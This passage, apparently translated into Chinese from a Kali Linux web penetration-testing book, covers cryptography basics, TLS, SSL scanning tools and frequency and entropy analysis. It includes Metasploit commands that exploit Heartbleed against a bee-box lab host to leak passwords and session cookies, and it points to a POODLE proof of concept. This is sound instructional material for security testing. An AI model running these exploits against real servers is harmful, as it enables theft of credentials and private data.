+   **编码**：这也改变了消息，但其主要目标是允许该消息被不同的系统处理。它不需要密钥，并且不被视为保护信息的正确方式。Base64 编码通常用于现代 Web 应用程序，以通过 HTTP 传输二进制数据。

+   **混淆**：这使原始消息更难阅读，通过转换消息来实现。JavaScript 代码混淆用于防止调试和/或保护知识产权，其最常见的用途是在 Web 应用程序中。它不被视为保护信息免受第三方侵害的方式。

+   **哈希**：哈希函数是计算消息内容的固定长度唯一数字。相同的消息必须始终产生相同的哈希值，而且没有两个消息可以共享哈希值。哈希函数在理论上是不可逆的，这意味着您无法从其哈希中恢复消息。由于这个限制，它们用作签名和完整性检查非常有用，但不能用于存储需要在某个时候恢复的信息。哈希函数也广泛用于存储密码。常见的哈希函数有 MD5、SHA1、SHA-512 和 bcrypt。

# 算法和模式

密码算法或密码是通过一些计算将明文转换为密文的算法。这些算法可以广泛分为以下两种方式：

+   根据它们使用的公钥和私钥或共享密钥，它们可以是**非对称**或**对称**的。

+   根据它们处理原始消息的方式，它们可以是**流密码**或**块密码**

# 非对称加密与对称加密

**非对称加密**使用公私钥的组合，比对称加密更安全。公钥与所有人共享，私钥单独存储。使用一个密钥加密的加密数据只能使用另一个密钥解密，这使得它在更大范围内实施非常安全和高效。

另一方面，**对称加密**使用相同的密钥对数据进行加密和解密，您需要找到一种安全的方法与其他方共享对称密钥。

经常被问到的一个问题是为什么不使用公私钥对来加密数据流，而是生成一个使用对称加密的会话密钥。公私钥的组合是通过复杂的数学过程生成的，这是一个处理器密集型和耗时的任务。因此，它仅用于验证端点并生成和保护会话密钥，然后在对称加密中使用该会话密钥对大量数据进行加密。这两种加密技术的组合结果是更快速和更高效的数据加密。

以下是非对称加密算法的例子：

+   **Diffie-Hellman 密钥交换**：这是 1976 年开发的第一个非对称加密算法，它在有限域中使用离散对数。它允许两个端点在不了解对方的情况下，在不安全的介质上交换秘密密钥。

+   **Rivest Shamir Adleman（RSA）**：这是最广泛使用的非对称算法。RSA 算法用于加密数据和签名，提供机密性和不可否认性。该算法使用一系列模乘法来加密数据。

+   **椭圆曲线密码学（ECC）**：这主要用于手持设备，如智能手机，因为它在加密和解密过程中需要较少的计算能力。ECC 功能类似于 RSA 功能。

# 对称加密算法

在**对称加密**中，使用共享密钥生成加密密钥。然后使用相同的密钥对数据进行加密和解密。这种加密数据的方式在各种形式中已经被使用了很长时间。它提供了一种简单的加密和解密数据的方法，因为密钥是相同的。对称加密简单且易于实现，但是它需要以安全的方式与用户共享密钥。

一些对称算法的例子如下：

+   **数据加密标准（DES）**：该算法使用 DEA 密码。DEA 是一种分组密码，使用 64 位密钥大小；其中 8 位用于错误检测，56 位用于实际密钥。考虑到今天计算机的计算能力，这种加密算法很容易被破解。

+   **三重 DES（3DES）**：该算法将 DES 算法应用于每个分组三次。它使用三个 56 位密钥。

+   **高级加密标准（AES）**：该标准首次发布于 1998 年，被认为比其他对称加密算法更安全。AES 使用了由两位比利时密码学家 Joan Daemen 和 Vincent Rijmen 开发的 Rijndael 密码。它取代了 DES 算法。它可以配置为使用可变的密钥大小，最小为 128 位，最大为 256 位。

+   **Rivest Cipher 4 (RC4)**: RC4 是一种广泛使用的流密码，其密钥大小可变，范围从 40 到 2048 位。RC4 存在一些设计缺陷，使其容易受到攻击，尽管这些攻击可能不实际且需要大量的计算能力。RC4 在 SSL/TLS 协议中被广泛使用。然而，许多组织已经开始使用 AES 代替 RC4。

# 流密码和分组密码

对称算法分为两个主要类别：

+   **流密码：**该算法一次加密一个比特，因此需要更多的处理能力。它还需要大量的随机性，因为每个比特都要用唯一的密钥流进行加密。流密码更适合在硬件层实现，并用于加密流式通信，如音频和视频，因为它可以快速加密和解密每个比特。使用这种算法产生的密文与原始明文的大小相同。

+   **块密码：**使用这种算法，原始消息被分成固定长度的块，并在最后一个块中填充（扩展到满足所需的长度）。然后，根据所使用的模式，独立处理每个块。我们将在后续章节中进一步讨论密码模式。块密码产生的密文大小始终是块大小的倍数。

# 初始化向量

加密算法是*确定性的*。这意味着相同的输入将始终产生相同的输出。这是一件好事，因为在解密时，您希望能够恢复与加密的完全相同的消息。不幸的是，这使得加密变得更弱，因为它容易受到密码分析和已知明文攻击的攻击。

为了解决这个问题，实现了**初始化向量**（**IVs**）。IV 是每次执行算法时都不同的额外信息。它用于生成加密密钥或预处理明文，通常通过异或操作进行。这样，如果两条消息使用相同的算法和相同的密钥加密，但使用不同的 IV，得到的密文将不同。IV 附加在密文上，因为接收者事先无法知道它们。

黄金法则，特别是对于流密码，永远不要重复使用 IV。无线网络中的**Wired Equivalent Privacy**（**WEP**）身份验证的 RC4 实现使用一个 24 位（3 字节）的 IV，允许在短时间内重复使用密钥流。通过多次使用相同 IV 发送已知文本（例如 DHCP 请求）通过网络，攻击者可以恢复密钥流，并且可以使用多个密钥流/IV 对来恢复共享密钥。

# 块密码模式

**操作模式**是加密算法如何使用 IV 以及如何实现对每个明文块的加密。接下来，我们将讨论最常见的操作模式：

+   **电子密码本（ECB）：**在这种操作模式下，没有使用 IV，每个块都是独立加密的。因此，包含相同信息的块导致相同的密文，这使得分析和攻击更容易。

+   **密码块链接（CBC）：**使用 CBC 模式，块按顺序加密；一个 IV 应用于第一个块，每个块的结果密文用作下一个块的 IV。CBC 模式密码可能容易受到填充预言攻击的影响，其中对最后一个块的填充可能被用来恢复密钥流，前提是攻击者能够恢复大量加密包并且有一种方法可以知道一个包是否具有正确的填充（预言）。

+   **计数器（CTR）：**如果正确实现，这可能是最方便和安全的方法。使用相同的 IV 加上每个块不同的计数器，独立加密块。这使得该模式能够并行处理消息的所有块，并且每个块都有不同的密文，即使明文相同。

# 哈希函数

**哈希函数**通常用于确保传输的消息的完整性，并作为确定两个信息是否相同的标识符。哈希函数生成一个表示实际数据的固定长度值（哈希）。

哈希函数适用于这些任务，因为根据定义，没有两个不同的信息片段应该具有相同的哈希结果（碰撞），并且原始信息不应该仅通过哈希来恢复（即，哈希函数不可逆）。

以下是一些最常见的哈希函数：

+   MD5（消息摘要 5）

+   SHA（安全散列算法）版本 1 和 2

+   NT 和 NTLM 是 Microsoft Windows 用于存储密码的基于 MD4 的方法

# 盐值

当用于存储密码等秘密信息时，哈希容易受到字典和暴力攻击的攻击。攻击者捕获一组密码哈希值后，可以尝试使用已知常见密码的字典对其进行哈希，并将结果与捕获的哈希进行比较，以寻找匹配并发现明文密码。一旦找到哈希-密码对，所有使用相同密码的其他用户或账户也会被发现，因为所有哈希值都是相同的。

通过附加一个随机值到要进行哈希的信息上，并导致使用不同的盐对相同数据进行哈希得到不同的哈希值，**盐值**用于使这个任务更加困难。在我们之前的假设情况中，恢复一个哈希的明文的攻击者不会自动恢复所有其他相同密码的实例。

与初始化向量（IV）一样，盐值也会与哈希一起存储和发送。

# 通过 SSL/TLS 进行安全通信

**安全套接字层**（**SSL**）是一种设计用于保护网络通信的加密协议。Netscape 于 1994 年开发了 SSL 协议。1999 年，**互联网工程任务组**（**IETF**）发布了**传输层安全**（**TLS**）协议，取代了 SSL 协议的第 3 版。由于多年来发现了多个漏洞，SSL 现在被认为是不安全的。POODLE 和 BEAST 漏洞在 SSL 协议本身中暴露了缺陷，因此无法通过软件补丁修复。IETF 宣布 SSL 已被弃用，并建议升级到 TLS 作为安全通信的协议。TLS 的最新版本是 1.2。我们始终建议您使用最新版本的 TLS，并避免允许使用旧版本或 SSL 协议的客户端连接。

大多数网站已经迁移到并开始使用 TLS 协议，但加密通信仍然通常被称为 SSL 连接。SSL/TLS 不仅提供机密性，还有助于维护数据的完整性和实现不可否认性。

保护客户端和 Web 应用程序之间的通信是 TLS/SSL 的最常见用途，也被称为**HTTPS**。TLS 还用于以下方式中其他协议使用的通信通道的安全保护：

+   它被邮件服务器用于加密两个邮件服务器之间以及客户端和邮件服务器之间的电子邮件

+   TLS 用于保护数据库服务器和 LDAP 认证服务器之间的通信

+   它被用于加密称为**SSL VPN**的**虚拟专用网络**（**VPN**）连接

+   Windows 操作系统中的远程桌面服务使用 TLS 对连接到服务器的客户端进行加密和认证

TLS 被用于保护两方之间的通信的几个其他应用和实现。在接下来的章节中，我们将把 HTTPS 使用的协议称为 TLS，并在只适用于 SSL 或 TLS 的情况下进行说明。

# Web 应用程序中的安全通信

TLS 使用公钥-私钥加密机制来加密数据，从而保护其免受第三方监听通信的影响。在网络上嗅探数据只会显示加密的信息，没有对应密钥的访问是无用的。

TLS 协议旨在保护 CIA 三要素（机密性、完整性和可用性）：

+   **机密性**：保持数据的隐私和保密性

+   **完整性**：保持数据的准确性和一致性，并确保在传输过程中未被更改

+   **可用性**：防止数据丢失并保持对数据的访问

Web 服务器管理员实施 TLS 以确保在 Web 服务器和客户端之间共享的敏感用户信息是安全的。除了保护数据的机密性外，TLS 还使用 TLS 证书和数字签名提供不可否认性。这提供了确保消息确实由声称发送它的一方发送的保证。这类似于我们日常生活中签名的工作方式。这些证书由独立的第三方机构，即**证书颁发机构**（**CA**）签署、验证和颁发。以下是一些知名的证书颁发机构：

+   VeriSign

+   Thawte

+   Comodo

+   DigiCert

+   Entrust

+   GlobalSign

如果攻击者试图伪造证书，浏览器将显示警告消息，通知用户正在使用无效证书加密数据。

通过使用哈希算法计算消息摘要来实现数据完整性，该摘要附加到消息上并在另一端进行验证。

# TLS 加密过程

加密是一个多步骤的过程，但对于最终用户来说是一个无缝的体验。整个过程可以分为两个部分：第一部分使用非对称加密技术进行加密，第二部分使用对称加密过程进行加密。以下是使用 SSL 加密和传输数据的主要步骤的描述：

1.  客户端和服务器之间的握手是初始步骤，客户端在其中呈现 SSL/TLS 版本号和支持的加密算法。

1.  服务器通过识别其支持的 SSL 版本和加密算法来响应，并且双方就最高的共同值达成一致。服务器还会响应 SSL 证书。该证书包含服务器的公钥和有关服务器的一般信息。

1.  然后，客户端通过将证书与存储在本地计算机上的根证书列表进行验证来对服务器进行身份验证。客户端与证书颁发机构（CA）检查，以确保颁发给网站的签名证书存储在受信任的 CA 列表中。在 Internet Explorer 中，可以通过导航到“工具”|“Internet 选项”|“内容”|“证书”|“受信任的根证书颁发机构”来查看受信任的 CA 列表，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00202.jpeg)

1.  使用握手期间共享的信息，客户端可以为会话生成一个预主密钥。然后，它使用服务器的公钥加密该密钥，并将加密的预主密钥发送回服务器。

1.  服务器使用私钥解密预主密钥（因为它是使用公钥加密的）。然后，服务器和客户端使用一系列步骤从预主密钥生成会话密钥。该会话密钥在整个会话期间加密数据，这称为对称加密。还计算并附加到消息的哈希有助于测试消息的完整性。

# 识别 SSL/TLS 的弱实现

正如您在前一节中学到的，TLS 是将各种加密算法打包成一个以提供机密性、完整性和身份验证的组合。在第一步中，当两个端点协商 SSL 连接时，它们识别出它们支持的公共密码套件。这使得 SSL 能够支持各种各样的设备，这些设备可能没有硬件和软件来支持较新的密码。支持旧的加密算法有一个主要缺点。大多数旧的密码套件在今天可用的计算能力下，很容易在合理的时间内被密码分析师破解。

# OpenSSL 命令行工具

为了识别远程 Web 服务器协商的密码套件，您可以使用预安装在所有主要 Linux 发行版上的 OpenSSL 命令行工具，它也包含在 Kali Linux 中。该工具可以在 bash shell 中直接测试 OpenSSL 库的各种功能，而无需编写任何代码。它也被用作故障排除工具。

OpenSSL 是一个在 Linux 中使用的著名库，用于实现 SSL 协议，而**Secure channel**（**Schannel**）是 Windows 中提供 SSL 功能的提供程序。

以下示例使用`s_client`命令行选项，使用 SSL/TLS 与远程服务器建立连接。该命令的输出对于新手来说很难解释，但对于识别服务器和客户端之间达成的 TLS/SSL 版本和密码套件是有用的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00203.jpeg)

OpenSSL 工具包含各种命令行选项，可用于使用特定的 SSL 版本和密码套件测试服务器。在以下示例中，我们尝试使用 TLS 版本 1.2 和弱算法 RC4 进行连接：

```
openssl s_client -tls1_2 -cipher 'ECDHE-RSA-AES256-SHA' -connect <target>:<port>  
```

以下屏幕截图显示了命令的输出。由于客户端无法与`ECDHE-RSA-AES256-SHA`密码套件协商，握手失败，没有选择密码套件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00204.jpeg)

在以下屏幕截图中，我们尝试与服务器协商使用弱加密算法。由于谷歌正确地在服务器上禁用了弱密码套件，因此失败了：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00205.jpeg)

要找出使用今天可用的计算能力很容易破解的密码套件，请输入以下屏幕截图中显示的命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00206.jpeg)

您经常会看到密码套件写成**ECDHE-RSA-RC4-MD5**。格式分解为以下部分：

+   **ECDHE**：这是一种密钥交换算法

+   **RSA**：这是一种身份验证算法

+   **RC4**：这是一种加密算法

+   **MD5**：这是一种哈希算法

可以在[`www.openssl.org/docs/apps/ciphers.html`](https://www.openssl.org/docs/apps/ciphers.html)找到 SSL 和 TLS 密码套件的全面列表。

# SSLScan

尽管 OpenSSL 命令行工具提供了许多选项来测试 SSL 配置，但该工具的输出对用户来说并不友好。该工具还需要对您要测试的密码套件有相当多的了解。

Kali Linux 带有许多工具，可以自动化识别 SSL 配置错误、过时的协议版本以及弱密码套件和哈希算法。其中一个工具是**SSLScan**，可以通过转到应用程序 | 信息收集 | SSL 分析来访问。

默认情况下，SSLScan 会检查服务器是否容易受到 CRIME 和 Heartbleed 漏洞的攻击。`-tls`选项将强制 SSLScan 仅使用 TLS 协议测试密码套件。输出以各种颜色分布，绿色表示密码套件是安全的，红色和黄色的部分试图吸引您的注意：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00207.jpeg)

通过运行以下命令可以识别客户端支持的密码套件。它将显示客户端支持的一长串密码套件：

```
sslscan -show-ciphers www.example.com:443  
```

如果要分析与证书相关的数据，请使用以下命令显示证书的详细信息：

```
sslscan --show-certificate --no-ciphersuites www.amazon.com:443  
```

可以使用`-xml=<filename>`选项将命令的输出导出为 XML 文档。

当在支持的密码名称中指出`NULL`时要小心。如果选择了`NULL`密码，SSL/TLS 握手将完成，浏览器将显示安全的挂锁，但 HTTP 数据将以明文形式传输。

# SSLyze

Kali Linux 还提供了另一个有用的工具，即 iSEC Partners 发布的 SSL 配置分析工具 SSLyze。该工具托管在 GitHub 上，网址为[`github.com/iSECPartners/sslyze`](https://github.com/iSECPartners/sslyze)，在 Kali Linux 中可以在 Applications | Information Gathering | SSL Analysis 中找到。SSLyze 是用 Python 编写的。

该工具配备了各种插件，可用于测试以下内容：

+   检查旧版本的 SSL

+   分析密码套件并识别弱密码

+   使用输入文件扫描多个服务器

+   检查会话恢复支持

使用`-regular`选项可以包括您可能感兴趣的所有常见选项，例如测试所有可用的协议（SSL 版本 2 和 3 以及 TLS 1.0、1.1 和 1.2）、测试不安全的密码套件以及识别是否启用了压缩。

在以下示例中，服务器不支持压缩，并且易受 Heartbleed 漏洞攻击。输出还列出了接受的密码套件。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00208.jpeg)

# 使用 Nmap 测试 SSL 配置

Nmap 包含一个名为`ssl-enum-ciphers`的脚本，可以识别服务器支持的密码套件，并根据其加密强度对其进行评级。它使用 SSLv3、TLS 1.1 和 TLS 1.2 进行多次连接。还有一些脚本可以识别已知的漏洞，如 Heartbleed 或 POODLE。

我们将使用三个脚本（`ssl-enum-ciphers`、`ssl-heartbleed`和`ssl-poodle`）对目标（bee-box v1.6，[`sourceforge.net/projects/bwapp/files/bee-box/`](https://sourceforge.net/projects/bwapp/files/bee-box/)）进行 Nmap 扫描，以列出服务器允许的所有密码并测试这些特定的漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00209.jpeg)

第一张截图显示了`ssl-enum-ciphers`的结果，显示了 SSLv3 允许的密码。下一张截图中，`ssl-heartbleed`脚本显示服务器存在漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00210.jpeg)

此外，`ssl-poodle`脚本将服务器标识为易受 POODLE 攻击的脆弱目标：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00211.jpeg)

# 利用 Heartbleed 漏洞

Heartbleed 漏洞于 2014 年 4 月被发现。它是 OpenSSL TLS 实现中的缓冲区超读情况，即可以从内存中读取比允许的更多的数据。这种情况允许攻击者以明文形式从 OpenSSL 服务器的内存中读取信息。这意味着无需解密或拦截客户端和服务器之间的任何通信，您只需向服务器询问其内存中的内容，它将以未加密的信息回答。

实际上，Heartbleed 漏洞可以在任何未修补的支持 TLS 的 OpenSSL 服务器上利用（版本 1.0.1 至 1.0.1f 和 1.0.2-beta 至 1.0.2-beta1），通过利用可以以明文形式从服务器的内存中读取最多 64 KB 的数据。这可以重复进行，而且在服务器中不会留下任何痕迹或日志。这意味着攻击者可能能够从服务器中读取明文信息，例如服务器的私钥或加密证书、会话 cookie 或可能包含用户密码和其他敏感信息的 HTTPS 请求。有关 Heartbleed 的更多信息，请参阅其维基百科页面[`en.wikipedia.org/wiki/Heartbleed`](https://en.wikipedia.org/wiki/Heartbleed)。

我们将使用 Metasploit 模块来利用 bee-box 中的 Heartbleed 漏洞。首先，您需要打开 Metasploit 控制台并加载该模块：

```
msfconsole
use auxiliary/scanner/ssl/openssl_heartbleed
```

使用`show options`命令，您可以查看模块运行所需的参数。

让我们设置要攻击的主机和端口，并运行该模块。请注意，该模块可以通过在`RHOSTS`选项中输入一个以空格分隔的 IP 地址和主机名列表来同时运行多个主机：

```
show options 
set RHOSTS 10.7.7.8 
set RPORT 8443 
run
```

下面执行的脚本显示服务器存在漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00212.jpeg)

然而，在这里没有提取到相关信息。出了什么问题？

实际上，该模块从服务器的内存中提取了信息，但还有更多的选项可以设置。您可以使用`show advanced`命令来显示 Metasploit 模块的高级选项。要查看获取的信息，请将`VERBOSE`选项设置为`true`并再次运行它：

```
set VERBOSE true
run
```

现在我们已经获取了一些信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00213.jpeg)

如果您分析结果，您会发现在这种情况下，服务器在内存中有一个密码更改请求，并且您可以看到先前和当前的密码以及用户的会话 cookie。

# POODLE

**Padding Oracle On Downgraded Legacy Encryption**（**POODLE**），顾名思义，是一种利用从 TLS 到 SSLv3 的降级过程的填充预言攻击。

填充预言攻击需要存在一个预言，也就是一种识别数据包填充是否正确的方法。这可能只是服务器返回的一个*填充错误*响应。当攻击者改变有效消息的最后一个字节时，服务器会返回一个错误。当消息被改变且没有导致错误时，填充被接受为该字节的值。通过 IV，这可以揭示一个字节的密钥流，并且通过这个密钥流可以解密加密文本。需要记住的是，IV 需要与数据包一起发送，以便接收者知道如何解密信息。这与盲注攻击非常相似。

为了实现这一点，攻击者需要在客户端和服务器之间实现中间人位置，并且需要一种机制来使客户端发送恶意探测。可以通过让客户端打开包含执行此工作的 JavaScript 代码的页面来实现这个最后的要求。

Kali Linux 没有包含一个开箱即用的工具来利用 POODLE，但是 GitHub 上有一个名为 Thomas Patzke 的**概念验证**（**PoC**）可以实现这一点：[`github.com/thomaspatzke/POODLEAttack`](https://github.com/thomaspatzke/POODLEAttack)。读者可以自行测试这个 PoC 作为练习。

在 Web 应用程序渗透测试期间，通常只需要查看 SSLScan、SSLyze 或 Nmap 的输出，就可以知道是否允许使用 SSLv3，从而确定服务器是否容易受到 POODLE 攻击；此外，不需要进行更多的测试来证明这一事实或者说服客户禁用一个已经过时近 20 年并且最近被宣布为废弃的协议。

尽管 POODLE 对于像 TLS 这样的加密协议来说是一个严重的漏洞，但在实际场景中执行它的复杂性使得攻击者更有可能使用诸如 SSL Stripping（[`www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf`](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf)）之类的技术来迫使受害者浏览未加密的协议。

# 自定义加密协议

作为渗透测试人员，发现开发人员对标准加密协议进行自定义实现或尝试创建自己的自定义算法并不罕见。在这种情况下，您需要特别注意这些模块，因为它们可能包含多个缺陷，如果在生产环境中发布可能会造成灾难性后果。

正如先前所述，加密算法是由信息安全专家和专门从事密码学的数学家通过多年的实验和测试创建的。对于单个开发人员或小团队来说，设计一个具有密码学强度的算法或改进像 OpenSSL 这样经过深入测试的实现，是非常不可能的。

# 识别加密和哈希信息

当遇到自定义的加密实现或无法识别为明文的数据时，首先要做的是定义提交此类数据的过程。如果源代码容易获得，这个任务相当简单。更有可能的情况是源代码不可用，需要通过多种方式分析数据。

# 哈希算法

如果一个过程的结果始终是相同的长度，无论提供的数据量如何，那么您可能面临的是一个哈希函数。要确定是哪个函数，可以使用结果值的长度：

| **函数** | **长度** | **示例，hash ("Web Penetration Testing with Kali Linux")** |
| --- | --- | --- |
| MD5 | 16 字节 | `fbdcd5041c96ddbd82224270b57f11fc` |
| SHA-1 | 20 字节 | `e8dd62289bcff206905cf269c06692ef7c6938a0` |
| SHA-2（256） | 32 字节 | `dbb5195ef411019954650b6805bf66efc5fa5fef4f80a5f4afda702154ee07d3` |
| SHA-2（512） | 64 字节 | `6f0b5c34cbd9d66132b7d3a4484f1a9af02965904de38e3e3c4e66676d9``48f20bd0b5b3ebcac9fdbd2f89b76cfde5b0a0ad9c06bccbc662be420b877c080e8fe` |

请注意，前面的示例使用两个十六进制数字来表示每个字节的十六进制编码，以表示每个字节的值（0-255）。为了澄清，MD5 哈希中的 16 个字节是 fb-dc-d5-04-1c-96-dd-bd-82-22-42-70-b5-7f-11-fc。例如，第 11 个字节（`42`）是十进制值 66，它是 ASCII 字母`B`。

此外，以 base64 编码形式表示哈希值也是常见的。例如，前面表格中的 SHA-512 哈希也可以表示为：

```
bwtcNMvZ1mEyt9OkSE8amvApZZBN444+PE5mZ22UjyC9C1s+vKyf29L4m3bP3lsKCtnAa8y8ZivkILh3wIDo/g== 
```

Base64 是一种编码技术，它使用可打印的 ASCII 字符集来表示二进制数据，其中一个 base64 编码的字节表示原始字节的 6 位，以便用 4 个 ASCII 可打印字节表示 3 个字节（24 位）。

# hash-identifier

Kali Linux 包含一个名为`hash-identifier`的工具，它有一个长列表的哈希模式，非常有用来确定所涉及的哈希类型：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00214.jpeg)

# 频率分析

判断一组数据是否加密、编码或混淆的一个非常有用的方法是分析数据中每个字符重复出现的频率。在明文消息中，比如一个字母，ASCII 字符在字母数字范围内（32 到 126）的频率要比斜杠或不可打印字符（如*Escape*（27）或*Delete*（127）键）高得多。

另一方面，人们预期加密文件的每个字符从 0 到 255 都具有非常相似的频率。

可以通过准备一组简单的文件进行比较来测试这一点。让我们将一个明文文件作为基准文件与该文件的两个其他版本进行比较：一个是混淆的，另一个是加密的。首先创建一个明文文件。使用`dmesg`将内核消息发送到文件中：

```
dmesg > /tmp/clear_text.txt  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00215.jpeg)

您还可以应用一种名为**旋转**的混淆技术，它以字母表中的循环方式将一个字母替换为另一个字母。我们将使用*ROT13*，在字母表中旋转 13 个位置（即，`a`将变为`n`，`b`将变为`o`，依此类推）。这可以通过编程或使用网站如[`www.rot13.com/`](http://www.rot13.com/)来完成：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00216.jpeg)

接下来，使用 OpenSSL 命令行工具和 AES-256 算法和 CBC 模式对明文文件进行加密：

```
openssl aes-256-cbc -a -salt -in /tmp/clear_text.txt -out /tmp/encrypted_text.txt  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00217.jpeg)

正如您所看到的，OpenSSL 的输出是 base64 编码的。在分析结果时，您需要考虑到这一点。

那么，如何对这些文件进行频率分析？我们将使用 Python 和 Matplotlib（[`matplotlib.org/`](https://matplotlib.org/)）库，在 Kali Linux 中预安装，以图形方式表示每个文件的字符频率。以下脚本接受两个命令行参数，一个文件名和一个指示器，如果文件是 base64 编码（`1`或`0`），则读取该文件，并在必要时解码。然后，它计算 ASCII 空间（0-255）中每个字符的重复次数，并绘制字符计数：

```
import matplotlib.pyplot as plt 
import sys 
import base64 

if (len(sys.argv))<2: 
    print "Usage file_histogram.py <source_file> [1|0]" 

print "Reading " + sys.argv[1] + "... " 
s_file=open(sys.argv[1]) 

if sys.argv[2] == "1": 
    text=base64.b64decode(s_file.read()) 
else: 
    text=s_file.read() 

chars=[0]*256 
for line in text: 
    for c in line: 
        chars[ord(c)] = chars[ord(c)]+1 

s_file.close() 
p=plt.plot(chars) 
plt.show() 
```

当比较明文（左）和 ROT13（右）文件的频率时，您会发现没有太大的区别-所有字符都集中在可打印范围内：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00218.jpeg)

另一方面，查看加密文件的图表时，分布更加混乱：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00219.jpeg)

# 熵分析

加密信息的一个明确特征是数据在字符级别上的随机性，这有助于将其与明文或编码区分开来。**熵**是数据集随机性的统计度量。

在基于字节的文件存储的网络通信中，每个字符的最大熵级别为八。这意味着这些字节中的所有八位在样本中被使用的次数相同。熵低于六可能表明样本未加密，而是混淆或编码，或者所使用的加密算法可能容易受到密码分析的攻击。

在 Kali Linux 中，您可以使用`ent`计算文件的熵。它没有预装，但可以在`apt`存储库中找到：

```
apt-get update
apt-get install ent  
```

作为 PoC，让我们对一个明文样本执行`ent`，例如`dmesg`的输出（内核消息缓冲区），其中包含大量的文本，包括数字和符号：

```
dmesg > /tmp/in
ent /tmp/in
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00220.jpeg)

接下来，让我们加密相同的信息并计算熵。在这个例子中，我们将使用 CBC 模式的 Blowfish：

```
openssl bf-cbc -a -salt -in /tmp/in -out /tmp/test2.enc
ent /tmp/test
2.enc
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00221.jpeg)

熵增加了，但不像加密样本那样高。这可能是因为样本有限（即只有可打印的 ASCII 字符）。让我们使用 Linux 内置的随机数生成器进行最后的测试：

```
head -c 1M /dev/urandom > /tmp/out
ent /tmp/out
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00222.jpeg)

理想情况下，强加密算法的熵值应该非常接近八，这将与随机数据无法区分。

# 识别加密算法

一旦我们进行了频率和熵分析，并且可以确定数据已加密，我们需要确定使用了哪种算法。一种简单的方法是比较多个加密消息的长度；考虑以下示例：

+   如果长度不能始终被八整除，您可能面临的是流密码，其中 RC4 是最流行的密码之一

+   AES 是一种分组密码，其输出的长度始终可以被 16 整除（128、192、256 等）

+   DES 也是一种分组密码；其输出的长度始终可以被 8 整除，但不一定可以被 16 整除（因为其密钥流为 56 位）

# 敏感数据存储和传输中的常见缺陷

作为渗透测试人员，在 Web 应用程序中寻找的重要事项之一是它们如何存储和传输敏感信息。如果数据以明文形式传输或存储，应用程序的所有者可能面临重大的安全问题。

如果敏感信息（如密码或信用卡数据）以明文形式存储在数据库中，那么利用 SQL 注入漏洞或以其他方式访问服务器的攻击者将能够读取此类信息并直接从中获利。

有时，开发人员会实现自己的混淆或加密机制，认为只有他们知道算法，没有其他人能够在没有有效密钥的情况下获取原始信息。尽管这可能阻止偶然的随机攻击者将该应用程序作为目标，但更专注的攻击者或者能够从信息中获得足够利益的攻击者将花时间理解算法并破解它。

这些自定义加密算法通常涉及以下变体：

+   **异或**：在原始文本和其他文本之间执行按位异或操作，该文本充当密钥，并重复足够次数以填充要加密的文本的长度。这很容易被破解，如下所示：

```
      if text XOR key = ciphertext, then text XOR ciphertext = key 
```

+   **替换**：该算法涉及将一个字符一致地替换为另一个字符，应用于所有文本。在这里，使用频率分析来解密文本（例如，*e*是英语中最常见的字母，[`en.wikipedia.org/wiki/Letter_frequency`](https://en.wikipedia.org/wiki/Letter_frequency)）或者比较已知文本和其加密版本的频率以推断密钥。

+   **混淆**：这涉及改变字符的位置。为了使混淆成为一种可恢复信息的方式，需要以一种一致的方式进行。这意味着它可以通过分析被发现和逆转。

在应用程序中实现加密时，另一个常见错误是将加密密钥存储在不安全的位置，例如可以从 Web 服务器的根目录或其他易于访问的位置下载的配置文件中。往往加密密钥和密码都是硬编码在源文件中，甚至在客户端代码中也是如此。

如今的计算机比 10-20 年前的计算机更强大。因此，一些在过去被认为是密码学强大的算法可能在几个小时或几天内被破解，考虑到现代 CPU 和 GPU 的性能。即使这些算法可以在几分钟内被破解，使用 DES 加密的信息或使用 MD5 散列的密码仍然很常见，这在当前技术下可以被破解。

最后，尽管在加密存储中尤其如此，但最常见的缺陷是使用弱密码和密钥来保护信息。对最近泄露的密码进行的分析告诉我们，最常用的密码如下（参考[`13639-presscdn-0-80-pagely.netdna-ssl.com/wp-content/uploads/2017/12/Top-100-Worst-Passwords-of-2017a.pdf`](https://13639-presscdn-0-80-pagely.netdna-ssl.com/wp-content/uploads/2017/12/Top-100-Worst-Passwords-of-2017a.pdf)）：

1.  `123456`

1.  `password`

1.  `12345678`

1.  `qwerty`

1.  `12345`

1.  `123456789`

1.  `letmein`

1.  `1234567`

1.  `football`

